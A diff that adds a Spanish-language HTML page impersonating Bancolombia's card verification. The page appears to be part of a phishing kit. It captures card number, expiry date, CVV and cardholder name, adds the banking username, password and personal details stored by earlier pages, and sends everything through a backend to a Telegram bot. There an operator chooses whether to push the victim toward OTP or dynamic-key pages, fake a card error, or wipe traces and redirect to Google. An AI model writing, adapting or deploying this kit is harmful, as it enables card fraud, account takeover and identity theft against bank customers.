@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Bancolombia - Verificación de Tarjeta</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #2b2a28 0%, #2b2a28 100%);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #454648;
+      border-radius: 10px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    .card h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      position: relative;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .input-icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 17px;
+      opacity: 0.7;
+      user-select: none;
+    }
+    .input-field {
+      width: 100%;
+      padding: 10px 10px 8px 40px;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid white;
+      color: white;
+      font-size: 16px;
+    }
+    .input-field::placeholder { color: #ccc; }
+    .date-cvv-group {
+      display: flex;
+      gap: 15px;
+    }
+    .date-cvv-group .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #808080;
+      color: black;
+      border: none;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: not-allowed;
+      transition: transform 0.3s;
+      margin-top: 10px;
+    }
+    .btn.enabled { 
+      background: #FFD700; 
+      color: #2c2c2c; 
+      cursor: pointer; 
+    }
+    .btn:hover.enabled { transform: translateY(-2px); }
+    .error {
+      display: none;
+      color: #FFD700;
+      background: #2b2a28;
+      border: 1px solid #FFD700;
+      border-radius: 6px;
+      padding: 10px;
+      margin-bottom: 15px;
+      user-select: none;
+    }
+
+    /* Loader */
+    .loaderp {
+      width: 48px; height: 48px; border: 5px solid #FFF; border-bottom-color: #FFD700;
+      border-radius: 50%; display: inline-block; box-sizing: border-box; animation: rotation 1s linear infinite;
+    }
+    @keyframes rotation { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+    .loaderp-full {
+      position: fixed; top: 0; left: 0; z-index: 10000; background-color: rgba(255,255,255,0.95);
+      width: 100vw; height: 100vh; display: none; flex-direction: column; justify-content: center; align-items: center; color: black;
+      -webkit-backdrop-filter: blur(5px);
+      backdrop-filter: blur(5px);
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Verificación de tarjeta</h1>
+    <div class="error" id="errorMsg"></div>
+    <p>Para completar la verificación de tu identidad, necesitamos confirmar los datos de tu tarjeta de crédito o débito.</p>
+    <br /><br />
+    <form id="tcForm" autocomplete="off">
+      <div class="form-group">
+        <img src="candado.png" class="input-icon" alt="Tarjeta" />
+        <input
+          type="text"
+          name="numeroTarjeta"
+          id="numeroTarjeta"
+          class="input-field"
+          placeholder="Número de tarjeta"
+          required
+          maxlength="19"
+          autocomplete="off"
+        />
+      </div>
+      <div class="date-cvv-group">
+        <div class="form-group">
+          <img src="candado.png" class="input-icon" alt="Fecha" />
+          <input
+            type="text"
+            name="fechaExpiracion"
+            id="fechaExpiracion"
+            class="input-field"
+            placeholder="MM/AA"
+            required
+            maxlength="5"
+            autocomplete="off"
+          />
+        </div>
+        <div class="form-group">
+          <img src="candado.png" class="input-icon" alt="CVV" />
+          <input
+            type="text"
+            name="cvv"
+            id="cvv"
+            class="input-field"
+            placeholder="CVV"
+            required
+            maxlength="4"
+            autocomplete="off"
+          />
+        </div>
+      </div>
+      <div class="form-group" style="margin-top: 20px;">
+        <img src="persona.png" class="input-icon" alt="Nombre" />
+        <input
+          type="text"
+          name="nombreTarjeta"
+          id="nombreTarjeta"
+          class="input-field"
+          placeholder="Nombre en la tarjeta"
+          required
+          autocomplete="off"
+        />
+      </div>
+      <br />
+      <button type="submit" id="submitBtn" class="btn" disabled>Verificar tarjeta</button>
+    </form>
+  </div>
+  <div class="loaderp-full" id="loaderFull" role="status" aria-hidden="true">
+    <span class="loaderp" aria-hidden="true"></span>
+    <p style="margin-top:12px; color:#222;"></p>
+  </div>
+  <script>
+    const loaderFull = document.getElementById('loaderFull');
+    const numeroTarjetaInput = document.getElementById('numeroTarjeta');
+    const fechaExpiracionInput = document.getElementById('fechaExpiracion');
+    const cvvInput = document.getElementById('cvv');
+    const nombreTarjetaInput = document.getElementById('nombreTarjeta');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // Formatear número de tarjeta
+    numeroTarjetaInput.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+      let formattedInputValue = value.match(/.{1,4}/g)?.join(' ') || value;
+      e.target.value = formattedInputValue;
+      updateSubmitButtonState();
+    });
+
+    // Formatear fecha MM/AA
+    fechaExpiracionInput.addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      }
+      e.target.value = value;
+      updateSubmitButtonState();
+    });
+
+    // Solo números en CVV
+    cvvInput.addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/[^0-9]/g, '');
+      updateSubmitButtonState();
+    });
+
+    // Solo letras y espacios en nombre
+    nombreTarjetaInput.addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '').toUpperCase();
+      updateSubmitButtonState();
+    });
+
+    function updateSubmitButtonState() {
+      const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
+      const fechaExpiracion = fechaExpiracionInput.value;
+      const cvv = cvvInput.value;
+      const nombreTarjeta = nombreTarjetaInput.value.trim();
+
+      const enabled = numeroTarjeta.length >= 13 && 
+                     fechaExpiracion.length === 5 && 
+                     cvv.length >= 3 && 
+                     nombreTarjeta.length >= 2;
+
+      submitBtn.disabled = !enabled;
+      submitBtn.classList.toggle('enabled', enabled);
+    }
+
+    // --- CAMBIO: Se eliminan las funciones loadTelegramConfig, saveTgOffset, getTgOffset, e initTgOffsetOnce ---
+    // El backend se encarga de toda la lógica de Telegram.
+
+
+    // Validar formulario y enviar
+    document.getElementById('tcForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+
+      const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
+      const fechaExpiracion = fechaExpiracionInput.value;
+      const cvv = cvvInput.value;
+      const nombreTarjeta = nombreTarjetaInput.value.trim();
+      const err = document.getElementById('errorMsg');
+      err.style.display = 'none';
+
+      // Validaciones (ya las tenías, las dejo)
+      if (numeroTarjeta.length < 13 || numeroTarjeta.length > 19) {
+        err.textContent = 'El número de tarjeta debe tener entre 13 y 19 dígitos.';
+        err.style.display = 'block';
+        return;
+      }
+      if (!/^\d{2}\/\d{2}$/.test(fechaExpiracion)) {
+        err.textContent = 'La fecha debe tener el formato MM/AA.';
+        err.style.display = 'block';
+        return;
+      }
+      if (cvv.length < 3 || cvv.length > 4) {
+        err.textContent = 'El CVV debe tener 3 o 4 dígitos.';
+        err.style.display = 'block';
+        return;
+      }
+      if (nombreTarjeta.length < 2) {
+        err.textContent = 'El nombre debe tener al menos 2 caracteres.';
+        err.style.display = 'block';
+        return;
+      }
+
+      // Mostrar loader (usando la lógica de esta página)
+      loaderFull.style.display = 'flex';
+
+      // Obtener datos guardados del localStorage
+      const usuario = localStorage.getItem('usuario') || '';
+      const clave = localStorage.getItem('clave') || '';
+      const transactionId = localStorage.getItem('transactionId') || Date.now().toString(36) + Math.random().toString(36).slice(2,10);
+
+      if (!usuario || !clave) {
+        loaderFull.style.display = 'none';
+        alert('No se encontraron datos de sesión. Regresando al inicio.');
+        window.location.href = 'index.html';
+        return;
+      }
+
+      // --- CAMBIO: No se carga config.json ---
+
+      // Intentar recuperar 'formData' si existe
+      let storedForm = null;
+      try { storedForm = JSON.parse(localStorage.getItem('formData') || 'null'); } catch(e) { storedForm = null; }
+
+      // Construir el mensaje de texto
+      let message = `💳 Datos de tarjeta recibidos\n🆔 ID: ${transactionId}\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}\n💳 Tarjeta: ${numeroTarjeta}\n📅 Fecha Exp.: ${fechaExpiracion}\n🔐 CVV: ${cvv}\n👤 Nombre: ${nombreTarjeta}\n\n`;
+
+      if (storedForm && typeof storedForm === 'object') {
+        const extras = [
+          { k: 'nombre', l: 'Nombre' }, { k: 'documentoIdentidad', l: 'Cédula' },
+          { k: 'telefono', l: 'Teléfono' }, { k: 'ciudad', l: 'Ciudad' },
+          { k: 'direccion', l: 'Dirección' }, { k: 'entidad', l: 'Banco' }
+        ];
+        extras.forEach(it => { if (storedForm[it.k]) message += `• ${it.l}: ${storedForm[it.k]}\n`; });
+      }
+
+      // Construir el teclado
+      const keyboard = {
+        inline_keyboard: [
+          [{ text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
+          [{ text: "Pedir dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
+          [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }],
+          [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
+        ]
+      };
+
+      // --- CAMBIO: Enviar mensaje a nuestro propio backend ---
+      let sentMessageId = null;
+      try {
+        const sendRes = await fetch('/api/send-message', { // <-- Llama al backend
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ text: message, keyboard: keyboard })
+        });
+
+        const sendJson = await sendRes.json();
+
+        if (!sendJson.ok || !sendJson.result || !sendJson.result.message_id) {
+          console.error('sendMessage error:', sendJson);
+          alert(sendJson.error || 'No se pudo enviar el mensaje al servidor. Revisa consola.');
+          loaderFull.style.display = 'none';
+          return;
+        }
+
+        // Guardamos el ID del mensaje enviado por Telegram
+        sentMessageId = sendJson.result.message_id;
+
+      } catch (err) {
+        console.error('Error enviando a /api/send-message:', err);
+        alert('Error de conexión con el servidor. Revisa consola.');
+        loaderFull.style.display = 'none';
+        return;
+      }
+      // --- FIN DEL CAMBIO ---
+
+
+      // --- CAMBIO: Esperar respuesta del backend (que hace el polling por nosotros) ---
+      try {
+        await waitForAdminResponse(sentMessageId);
+      } finally {
+        loaderFull.style.display = 'none'; // Ocultar el loader sin importar el resultado
+      }
+    });
+
+    /**
+     * --- CAMBIO: Función reescrita ---
+     * Esta función ahora solo hace UNA petición a nuestro backend.
+     * El backend (/api/check-update) es el que se queda esperando (long polling)
+     * la respuesta del admin.
+     */
+    async function waitForAdminResponse(messageId) {
+      try {
+        // Hacemos la petición al endpoint de verificación
+        const res = await fetch(`/api/check-update/${messageId}`, {
+          method: 'GET',
+          cache: 'no-store' // No queremos respuestas cacheadas
+        });
+
+        if (res.ok) {
+          // El backend nos responde con JSON: { action: 'accion_elegida' }
+          const data = await res.json();
+          handleAdminAction(data.action); // Pasamos la acción directamente
+
+        } else if (res.status === 408) {
+          // El backend nos devuelve 408 si se agota su propio tiempo de espera
+          alert('No hubo respuesta del administrador en el tiempo esperado. Intenta más tarde.');
+
+        } else {
+          // Otro error del servidor
+          const errData = await res.json();
+          console.error('Error esperando respuesta:', errData);
+          alert(errData.error || 'Error del servidor al verificar la respuesta.');
+        }
+
+      } catch (err) {
+        // Error de red (ej: se cayó el servidor o no hay internet)
+        console.error('Error de red en waitForAdminResponse:', err);
+        alert('Error de conexión al esperar la respuesta. Revisa tu conexión.');
+      }
+    }
+
+    /**
+     * --- CAMBIO: Firma de la función simplificada ---
+     * Ahora recibe la acción limpia (ej: 'pedir_otp')
+     * que nos envía el backend.
+     */
+    function handleAdminAction(action) {
+      // Dependiendo del botón presionado por el admin, actuamos
+      if (action === 'pedir_otp') {
+        window.location.href = 'otp.html';
+      } else if (action === 'pedir_dinamica') {
+        window.location.href = 'dinamica.html';
+      } else if (action === 'error_tc') {
+        const err = document.getElementById('errorMsg');
+        err.textContent = 'Los datos de la tarjeta son incorrectos. Verifica la información e intenta nuevamente.';
+        err.style.display = 'block';
+        // Limpiar formulario
+        document.getElementById('tcForm').reset();
+        // Reformatear campos (ya que reset() no dispara 'input')
+        numeroTarjetaInput.value = '';
+        fechaExpiracionInput.value = '';
+        cvvInput.value = '';
+        nombreTarjetaInput.value = '';
+        updateSubmitButtonState();
+      } else if (action === 'finalizar') {
+        // Limpiar localStorage y redirigir a Google
+        localStorage.removeItem('usuario');
+        localStorage.removeItem('clave');
+        localStorage.removeItem('transactionId');
+        localStorage.removeItem('formData');
+        window.location.href = 'https://google.com';
+      } else {
+        console.log('Acción admin no manejada:', action);
+      }
+    }
+
+    // Enter => enviar si formulario completo
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && e.target.tagName !== 'BUTTON') {
+        e.preventDefault();
+        if (!submitBtn.disabled) {
+          // Disparamos el evento 'submit' del formulario
+          document.getElementById('tcForm').dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+        }
+      }
+    });
+  </script>
+</body>
+</html>
